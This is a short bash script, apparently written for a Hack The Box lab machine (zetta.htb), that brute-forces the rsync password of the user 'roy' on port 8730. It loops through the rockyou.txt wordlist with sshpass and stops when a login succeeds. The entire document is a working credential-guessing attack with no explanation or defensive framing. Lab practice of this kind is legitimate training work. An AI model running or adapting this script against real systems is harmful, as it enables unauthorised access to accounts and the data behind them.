#!/bin/bash

function def_handler(){
	echo -e "\n\n[*]Saindo...\n\n"
	exit 1
}

trap def_handler INT

for wordlist in $(cat /usr/share/wordlists/rockyou.txt); do
	sshpass -p "$wordlist" rsync rsync://roy@zetta.htb:8730/home_roy &>/dev/null
	if [ "$(echo $?)" == "0" ]; then
		echo -e "\n[*]Password\n$wordlist\n"
		exit 0
	fi
done
